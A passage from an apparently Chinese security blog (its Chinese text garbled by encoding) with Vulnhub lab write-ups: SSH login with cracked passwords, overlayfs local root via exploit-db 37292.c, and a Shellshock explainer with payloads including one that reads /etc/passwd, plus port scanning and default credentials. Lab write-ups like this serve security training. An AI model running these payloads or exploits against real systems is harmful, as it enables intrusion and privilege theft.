<p>åˆå¾—åˆ°ä¸€ä¸ªrootæƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œè¿™å¹¶ä¸æ˜¯çœŸæ­£çš„ç›®æ ‡ä¸»æœºï¼Œå› æ­¤è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚å…ˆæŸ¥çœ‹ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ª passwords çš„æ–‡ä»¶ã€‚æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
<p>å¯†ç ä¸€èˆ¬éƒ½æ˜¯md5åŠ å¯†çš„ï¼Œæ•…å°è¯•å°†æ‰€æœ‰å¯†ç ç”¨md5è§£å¯†ï¼Œæ¨èç½‘å€ï¼š<a href="https://www.somd5.com/">MD5è§£å¯†</a>å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
<p>æƒ³å»ç›®æ ‡ä¸»æœºå¼€äº† 22 ç«¯å£ï¼ŒæœåŠ¡ä¸º sshï¼Œå› æ­¤å°è¯•ä½¿ç”¨è€…è¿™äº›è´¦å·å’Œå¯†ç è¿æ¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 ä¸æŒ‡å®šç«¯å£çš„è¯ï¼Œé»˜è®¤å°±æ˜¯22</span><br></pre></td></tr></table></figure></p>
<p>ç»å°è¯•ï¼Œå‘ç°åªæœ‰ john èƒ½å¤ŸæˆåŠŸç™»å½•ã€‚æ¥ä¸‹æ¥å°±æ˜¯ææƒäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
<h2 id="æƒé™æå‡-æœ¬åœ°ææƒ">æƒé™æå‡-æœ¬åœ°ææƒ</h2>
<p>Linuxææƒä¸€èˆ¬ä¼˜å…ˆè€ƒè™‘å†…æ ¸æ¼æ´è¿›è¡Œææƒã€‚ä»sshè¿æ¥å¯ä»¥çœ‹å‡ºé¶æœºçš„ç³»ç»Ÿä¸º Ubuntu å¹¶ä¸”ç‰ˆæœ¬ä¸º 3.13.0ï¼Œå½“ä¸”çš„ç‰ˆæœ¬å› è¯¥æ˜¯5.xã€‚è¿™é‡Œå·®äº†ä¸¤ä¸ªå¤§æ›´æ–°ï¼Œå› æ­¤å¤§æ¦‚ç‡å­˜åœ¨ç€æ¼æ´ã€‚ç”¨msfæœç´¢ã€‚ <code>searchsploit linux kernel 3.13</code> å¯ä»¥çœ‹åˆ°æœç´¢å‡ºå¾ˆå¤šï¼ŒçœŸå®åœºæ™¯çš„è¯éœ€è¦ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œè¿™é‡Œå°±æŒ‘é€‰ä¸€ä¸ª 37292.c</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
<p>å¤åˆ¶expåˆ°å½“å‰ç›®å½• <code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
<p>è¿™æ˜¯cç¼–å†™çš„ï¼Œéœ€è¦ç”¨ gcc ç¼–è¯‘ï¼Œä½†æ˜¯ç›®æ ‡ä¸»æœºå¯èƒ½æ²¡æœ‰ gccï¼Œæ‰€ä»¥éœ€è¦åœ¨kaliä¸Šç¼–è¯‘å®Œåœ¨ä¼ åˆ°é¶æœºã€‚å› ä¸ºå®ƒæ˜¯Cè¯­è¨€å†™çš„ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹å†…å®¹æ˜¯å¦è¿˜æœ‰ç¼–è¯‘çš„</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
<p>æ³¨æ„åˆ°ï¼Œä»£ç ä¸­è¿˜è°ƒç”¨systemï¼Œç„¶ååˆ©ç”¨ gcc è¿›è¡Œç¼–è¯‘ï¼Œå› æ­¤è¦è¿›è¡Œä¿®æ”¹ã€‚æŠŠç›¸å…³çš„ä»£ç åˆ é™¤ï¼Œç„¶åè¿›è¡Œç¼–è¯‘ã€‚ï¼ˆåˆ æ‰éƒ¨åˆ†ä»å›¾ä¸­ç¬¬äºŒè¡Œå¼€å§‹åˆ°ifè¯­å¥ç»“æŸï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
<p>å°† <code>ofs-lib.so</code> æ–‡ä»¶ä¹Ÿå¤åˆ¶åˆ°ç›¸åŒç›®å½•ï¼Œä¸€èµ·ä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">å¦‚æœæç¤ºï¼švar/lib/mlocate/mlocate.db: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚è¯´æ˜æ•°æ®åº“å¤ªä¹…æ²¡æ›´æ–°äº†ï¼Œåˆ©ç”¨ updtedb æ›´æ–°ä¸€ä¸‹åœ¨æœç´¢å³å¯ã€</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
<p>ç„¶åå¼€å¯httpæœåŠ¡ï¼Œç›®æ ‡ä¸»æœºä¸‹è½½è¿™ä¸¤ä¸ªæ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
<blockquote>
<p>ä¸ºäº†æ›´å¥½çš„åˆ©ç”¨expï¼Œå»ºè®®å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ç§»åˆ° <code>tmp</code> ç›®å½•ï¼Œå› ä¸ºè¿™ä¸ªç›®å½•çš„æƒé™ä¸€èˆ¬æ¯”è¾ƒå¤š</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œexpæ‹¿åˆ°rootæƒé™ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæ•´ä¸ªé¶æœºçš„æ”»å‡»è¿‡ç¨‹éƒ½ç»“æŸäº†ã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å®Œæ•´çš„æ¸—é€è¿‡ç¨‹ä¸»è¦æœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<ol type="1">
<li>åˆ©ç”¨Webæ¼æ´ï¼Œæ‹¿åˆ°webshellï¼Œç„¶åå†æ‹¿åˆ°ä½æƒé™shellï¼›</li>
<li>æƒé™æå‡ï¼Œæ”¶é›†å†…ç½‘ä¿¡æ¯ï¼Œç¡®è®¤å­˜æ´»ä¸»æœºã€‚ä¿¡æ¯æ”¶é›†çš„è¶Šå¤šï¼Œå‘ç°çš„å¯åˆ©ç”¨æ¼æ´è¶Šå¤šï¼Œç¬¬ä¸‰æ­¥è¶Šå®¹æ˜“æˆåŠŸï¼›</li>
<li>ä¾æ¬¡æ‹¿åˆ°æƒé™ï¼Œæœ€ç»ˆæ‹¿åˆ°ç›®æ ‡ä¸»æœºçš„rootæƒé™ï¼ˆæ¯”å¦‚åŸŸæ§ï¼‰ï¼›</li>
</ol>
<p>è¯¥é¶æœºç»™æˆ‘çš„æœ€å¤§å¯ç¤ºå¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>æ‰¾åˆ°æ¼æ´expçš„æ—¶å€™ä¸è¦ç€æ€¥çš„åˆ©ç”¨ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹ä»£ç ï¼Œä»£ç ä¸­æ‰€åˆ©ç”¨çš„å‘½ä»¤å¯èƒ½ç›®æ ‡ä¸»æœºä¸Šå¹¶æ²¡æœ‰ï¼Œæ‰€ä»¥éœ€è¦åœ¨æˆ‘ä»¬è‡ªå·±çš„ä¸»æœºä¸Šå‡†å¤‡å°±ç»ªåå†ä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚</li>
<li><code>/tmp</code> æƒé™æ¯”è¾ƒå¤š</li>
</ol>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>10 Vulnhub HackSudoThor Writeup</title>
    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºä¸­ç­‰ï¼Œä¸»è¦æ˜¯<strong>ç ´å£³æ¼æ´</strong>ä¸ºç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæœ‰ç‚¹æ²¡åº•ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
<p>éš¾åº¦ï¼šä¸­</p>
<p>ç›®æ ‡ï¼šå–å¾—rootæƒé™ + 2 Flag</p>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>webè·¯å¾„çˆ¬å–</li>
<li><strong>å¼€æºæºç æ³„éœ²</strong></li>
<li>é»˜è®¤è´¦å·å¯†ç </li>
<li><strong>ç ´å£³æ¼æ´</strong></li>
<li><strong>GTFOBinsææƒ</strong></li>
</ul>
<h1 id="common-gateway-interface-åŸºç¡€">Common Gateway Interface åŸºç¡€</h1>
<p>CGIå³é€šç”¨ç½‘å…³æ¥å£ã€‚é€šç”¨æŒ‡çš„æ˜¯ä¸å—è¯­è¨€é™åˆ¶ï¼Œç†è®ºæ¥è¯´ï¼Œæ‰€æœ‰æ”¯æŒæ ‡å‡†è¾“å‡ºã€æ”¯æŒè·å–ç¯å¢ƒå˜é‡çš„ç¼–ç¨‹è¯­è¨€éƒ½èƒ½å¤Ÿç¼–å†™CGIç¨‹åºã€‚</p>
<p>è€Œç½‘å…³ï¼Œå¯ä»¥ç§°ä¹‹ä¸ºâ€œç¿»è¯‘å®˜â€ï¼Œç½‘å…³çš„è¾“å…¥ä¸è¾“å‡ºé€šå¸¸æ˜¯ä¸¤ç§ä¸åŒçš„åè®®ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªä¼ä¸šçš„ä¸€å°æœåŠ¡å™¨ï¼Œå®ƒçš„ä¸€ç«¯è¿æ¥HTTPåè®®ï¼Œå¦ä¸€å‘å¯èƒ½è¿æ¥ç€å…¶ä»–åè®®ï¼Œæ¯”å¦‚ä¼ä¸šå†…éƒ¨ä½¿ç”¨çš„åè®®ã€‚CGIçš„åŠŸèƒ½ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œé€šå¸¸å°†CGIéƒ¨ç½²åˆ°WebæœåŠ¡å™¨ä¸Šï¼Œç„¶åç”±WebæœåŠ¡å™¨è°ƒç”¨CGIç¨‹åºã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
<p><strong>æ¥å£</strong>ï¼Œç¡®åˆ‡è€Œè¨€æ˜¯â€œæ¥å£åè®®â€ã€‚æ‰€è°“åè®®ï¼Œæ˜¯é€šä¿¡åŒæ–¹æˆ–å¤šæ–¹éƒ½å…±è¯†å¹¶éµå®ˆçš„ä¸€å¥—è§„åˆ™ã€‚</p>
<p>å…¶å®ä¸ç®¡æ˜¯TCP/IPæˆ–æ˜¯HTTPï¼Œéƒ½å¯ä»¥ç»Ÿç§°ä¸ºâ€œç½‘ç»œåè®®â€ï¼Œç²—æµ…ä¸€ç‚¹ç†è§£å°±æ˜¯â€œ<strong>æè¿°æŠ¥æ–‡å†…å®¹è¯¦ç»†è¯­ä¹‰çš„åè®®</strong>â€ã€‚è€Œâ€œæ¥å£åè®®â€å´ä¸ç„¶ï¼Œä»–ä¸ä¼šå®šä¹‰å“ªäº›å­—èŠ‚è¯¥å†™ä»€ä¹ˆï¼Œä¹Ÿä¸ä¼šå®šä¹‰å­—ç¬¦çš„å†…å®¹è§„èŒƒã€‚CGIå…¶å®æ˜¯æ„æ¶åœ¨HTTPåè®®ä¹‹ä¸Šçš„ã€‚å®ƒæè¿°çš„æ˜¯<strong>å¦ä¸€ä¸ªç»´åº¦çš„å…±è¯†æ ‡å‡†</strong>ã€‚</p>
<center>
è¾“å…¥
</center>
<p>WebæœåŠ¡å™¨è°ƒç”¨æŸä¸ªcgiç¨‹åºï¼Œé¦–å…ˆæŠŠHTTPè¯·æ±‚ä¸­çš„ä¿¡æ¯ä»¥ç¯å¢ƒå˜é‡çš„æ–¹å¼å†™å…¥OSï¼Œç„¶åCGIç¨‹åºé€šè¿‡è¯­è¨€åº“å‡½æ•°æ¥è·å–ç¯å¢ƒå˜é‡ä»è€Œè·å¾—æ•°æ®çš„è¾“å…¥ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡æ ‡å‡†è¾“å…¥è·å¾—æ•°æ®ï¼Œæ¯”å¦‚POSTè¯·æ±‚è°ƒç”¨cgiç¨‹åºæ—¶ï¼Œcgiç¨‹åºå°±ä¼šé€šè¿‡æ ‡å‡†è¾“å…¥è·å¾—bodyä¸­çš„æ•°æ®ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<ol type="1">
<li>å¦‚æœä¸ç»è¿‡HTTPè¯·æ±‚ï¼Œé‚£ä¹ˆcgiç¨‹åºè·å¾—æ•´ä¸ªOSçš„ç¯å¢ƒå˜é‡ï¼›</li>
<li>å¦‚æœç»è¿‡HTTPè¯·æ±‚ï¼Œé‚£ä¹ˆcgiç¨‹åºé™¤äº†è·å¾—æ•´ä¸ªOSçš„ç¯å¢ƒå˜é‡ä¹‹å¤–ï¼Œè¿˜ä¼šé¢å¤–è·å¾—HTTPå¤´éƒ¨ä¿¡æ¯ï¼›</li>
</ol>
<center>
è¾“å‡º
</center>
<p>CGIé€šè¿‡æ ‡æ³¨è¾“å‡ºå†™æ•°æ®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶CGIæ‰¿æ‹…HTTPåè®®çš„å“åº”éƒ¨åˆ†ï¼Œå› æ­¤éœ€è¦å°†HTTPå“åº”å¤´éƒ¨ä¹Ÿè¦é€šè¿‡æ ‡å‡†è¾“å‡ºæ‰“å°ã€‚</p>
<h1 id="ç ´å£³æ¼æ´">ç ´å£³æ¼æ´</h1>
<h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>
<p>Bash 4.3ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬åœ¨å¤„ç†æŸäº›æ„é€ çš„ç¯å¢ƒå˜é‡æ—¶å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå‘ç¯å¢ƒå˜é‡å€¼å†…çš„å‡½æ•°å®šä¹‰åæ·»åŠ å¤šä½™çš„å­—ç¬¦ä¸²ä¼šè§¦å‘æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ”¹å˜æˆ–ç»•è¿‡ç¯å¢ƒé™åˆ¶ï¼Œä»¥æ‰§è¡Œä»»æ„çš„shellå‘½ä»¤,ç”šè‡³å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚</p>
<h2 id="å‰ç½®æŠ€æœ¯">å‰ç½®æŠ€æœ¯</h2>
<p>å‚è€ƒé“¾æ¥ï¼šhttps://www.freebuf.com/articles/system/279713.html</p>
<h3 id="bashåŸºç¡€">bashåŸºç¡€</h3>
<p>åœ¨bashä¸­ï¼Œå¯ä»¥è‡ªå®šä¹‰å˜é‡ï¼Œå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
<p>ä½†æ˜¯å®šä¹‰çš„è¿™ä¸ªå˜é‡åªæ˜¯å±€éƒ¨çš„ï¼Œå¦‚æœç”¨å½“å‰çš„bashä»æ–°å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œåˆ™æ— æ³•è¾“å‡º</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
<p>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©å­è¿›ç¨‹æˆ–è€…å…¶ä»–è¿›ç¨‹ä¹Ÿèƒ½å¤Ÿè®¿é—®è¯¥å˜é‡å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯å°†è¯¥å˜é‡è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ï¼Œå› ä¸ºç¯å¢ƒå˜é‡æ˜¯å…¨å±€å˜é‡ã€‚å¯ä»¥é€šè¿‡<code>export</code>å‘½ä»¤æ·»åŠ å…¨å±€å˜é‡</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
<p>åœ¨bashä¸­è¿˜å¯ä»¥å®šä¹‰shellå‡½æ•°å¹¶å°†å…¶å¯¼å‡ºä¸ºç¯å¢ƒå˜é‡ï¼Œåªè¦åŠ ä¸Šå‚æ•°<code>-f</code>å³å¯ã€‚å¦‚æœä¸å°†å‡½æ•°è®¾ç½®ä¸ºå…¨å±€å˜é‡ï¼Œé‚£ä¹ˆå­è¿›ç¨‹åŒæ ·æ— æ³•ä½¿ç”¨ï¼Œå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
<p>å°†å‡½æ•°å¯¼å…¥å…¨å±€å˜é‡ä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
<p>bashä¸­è¿˜å¯ä»¥<strong>é€šè¿‡ç¯å¢ƒå˜é‡æ¥å®šä¹‰å‡½æ•°</strong>ã€‚å½“æŸä¸ªç¯å¢ƒå˜é‡çš„å€¼ä»¥å­—ç¬¦ä¸²<code>()&#123;</code>çš„æ ¼å¼ä½œä¸ºå¼€å¤´ï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±ä¼šè¢«å½“å‰çš„bashå½“ä½œä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œè¯¥å‡½æ•°ä»…åœ¨å½“å‰bashçš„å­è¿›ç¨‹ç”Ÿæ•ˆã€‚ï¼ˆç‰ˆæœ¬è¾ƒé«˜çš„bashåˆ™ä¸èƒ½è¿™ä¹ˆåšï¼Œå› æ­¤æˆ‘åˆ©ç”¨<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>åšæµ‹è¯•ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
<h2 id="å½±å“çš„ç‰ˆæœ¬">å½±å“çš„ç‰ˆæœ¬</h2>
<p>bash version &lt;= 4.3</p>
<h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2>
<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">å¤ç°ï¼šBash Shellshock ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271)</a></p>
<h2 id="åˆ©ç”¨åˆ†æ">åˆ©ç”¨åˆ†æ</h2>
<p><strong>æ¼æ´åŸç†</strong>ï¼š</p>
<p>Bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥<code>()&#123;</code>å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨<strong>è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­</strong>ã€‚</p>
<p><strong>æ¥ä¸‹æ¥æ‰æ˜¯æ¼æ´äº§ç”Ÿçš„é‡ç‚¹ï¼š</strong></p>
<p>å¦‚æœæˆ‘ä»¬å¯¼å…¥å¦‚ä¸‹çš„å­—ç¬¦ä¸²ä¸ºå…¨å±€å˜é‡ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆåœ¨å½“å‰è¿›ç¨‹ä¸‹<code>func</code>ä¸ä¼šè¢«æ‰§è¡Œã€‚è€Œä¸€æ—¦å¯åŠ¨å­è¿›ç¨‹<code>bash</code>ï¼Œåˆ™ä¼šç«‹å³æ‰§è¡Œ<code>cat /etc/passwd</code>ï¼Œå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
<p>å¹¶ä¸”æ­¤æ—¶<code>func</code>ä¹Ÿä¼šè¢«å½“ä½œå‡½æ•°æ‰§è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
<p>è¿™æ˜¯å› ä¸ºå­è¿›ç¨‹<code>bash</code>åœ¨åŠ è½½ç¯å¢ƒå˜é‡æ—¶é¦–å…ˆå°†<code>func</code>å‡½æ•°å½“ä½œç¯å¢ƒå˜é‡ï¼Œç„¶åç»§ç»­åŠ è½½åé¢çš„<code>cat /etc/passwd</code>ï¼Œæ­¤æ—¶å› ä¸ºè¿˜å¤„åœ¨shellä¸­ï¼Œä¼šå°†è¿™ä¸²å­—ç¬¦ä¸²å½“ä½œshellå‘½ä»¤æ‰§è¡Œã€‚å› æ­¤ä¸€æ—¦å¯åŠ¨å­è¿›ç¨‹<code>bash</code>ï¼Œå°±ä¼šç«‹å³æ‰§è¡Œè¿™ä¸²ä»£ç ã€‚</p>
<p>æ‰€ä»¥è¯¥æ¼æ´éœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š 1. è¢«æ”»å‡»çš„bashå­˜åœ¨æ¼æ´ï¼ˆç‰ˆæœ¬å°äºç­‰äº4.3ï¼‰ 2. æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡ 3. æ–°çš„bashè¿›ç¨‹è¢«æ‰“å¼€è§¦å‘æ¼æ´å¹¶æ‰§è¡Œå‘½ä»¤</p>
<p>å½“ CGI è„šæœ¬æ¥æ”¶åˆ°ä¸€æ¬¡ HTTP è¯·æ±‚ , å®ƒçš„ç¯å¢ƒå˜é‡å°±ä¼šæ–°å¢ä¸€äº›æ¡ç›® , æ¯”å¦‚ User-Agent , Connection ç­‰ä¿¡æ¯ã€‚å› æ­¤ , åœ¨ç»™å‡ºçš„ POC ä¸­ , æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ User-Agent æ¥ä¿®æ”¹ CGI ç¯å¢ƒå˜é‡ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>ä¸­é—´é‚£ä¸ª<code>:</code>å¯ä»¥ç”¨å…¶ä»–å­—ç¬¦ä»£æ›¿ï¼Œä¸€å®šè¦æœ‰å­—ç¬¦ï¼ ä¸­é—´é‚£ä¸ª<code>echo</code> ä¸èƒ½çœç•¥ã€‚HTTPå¤´éƒ¨ä¿¡æ¯æ¯ä¸€è¡Œéƒ½æ˜¯ç‹¬ç«‹çš„ä¿¡æ¯ï¼Œè¿™é‡Œçš„echoå°±å……å½“æ¢è¡Œç¬¦ã€‚ï¼ˆä¸æ˜¯å¾ˆèƒ½ç†è§£è¿™é‡Œçš„æ„æ€ï¼‰</p>
</blockquote>
<h2 id="åˆ©ç”¨åœºæ™¯">åˆ©ç”¨åœºæ™¯</h2>
<ul>
<li><p>ç¨‹åºåœ¨æŸä¸€æ—¶åˆ»ä½¿ç”¨ bash ä½œä¸ºè„šæœ¬è§£é‡Šå™¨å¤„ç†ç¯å¢ƒå˜é‡èµ‹å€¼</p></li>
<li><p>ç¯å¢ƒå˜é‡çš„èµ‹å€¼å­—ç¬¦ä¸²æ¥æºäºç”¨æˆ·è¾“å…¥ , ä¸”æ²¡æœ‰é€šè¿‡æœ‰æ•ˆçš„è¿‡æ»¤</p></li>
</ul>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>kaliï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
<ul>
<li>21ç«¯å£çš„æœåŠ¡ä¸ºftp</li>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œapache2.4.38</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºdebian</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>é¡µé¢æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œå°è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œå‘ç°æ²¡æœ‰ç”¨ã€‚åˆå»çœ‹äº†æºç ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–°ï¼Œç„¶åä¾æ¬¡åˆæŸ¥çœ‹äº†<code>HOME, NEWS, CONCAT, ABOUT US</code>å‘ç°éƒ½æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ä¸è¿‡<code>CONCAT</code>ä¸‹é¢æœ‰è®¸å¤šä¸ªäººä¿¡æ¯ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹è´¦å·å’Œå¯†ç æ˜¯å¦ä¸è¿™æœ‰å…³ã€‚</p>
<p>æ¥ç€è¿›è¡Œè·¯å¾„å‘ç°ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
<p>å…ˆæŸ¥çœ‹ä¸€ä¸‹<code>README.md</code>ï¼Œåœ¨é‡Œé¢å‘ç°äº†è¿™ä¸ªç½‘ç«™æ˜¯ç”¨ä¸€ä¸ªå¼€æºçš„æ¡†æ¶æ­å»ºçš„ï¼Œå¹¶ä¸”è¿˜ç»™å‡ºäº†åœ°å€ https://github.com/zakee94/online-banking-system</p>
<p>è®¿é—®ç½‘ç«™ï¼Œæ‰¾åˆ°äº†ä¸‹é¢è¿™å¥è¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
<p>ç»™å‡ºäº†adminç”¨æˆ·çš„é»˜è®¤è´¦å·å’Œå¯†ç ï¼Œä»¥åŠæ™®é€šç”¨æˆ·çš„é»˜è®¤è´¦å·å’Œé»˜è®¤å¯†ç æ ¼å¼ã€‚</p>
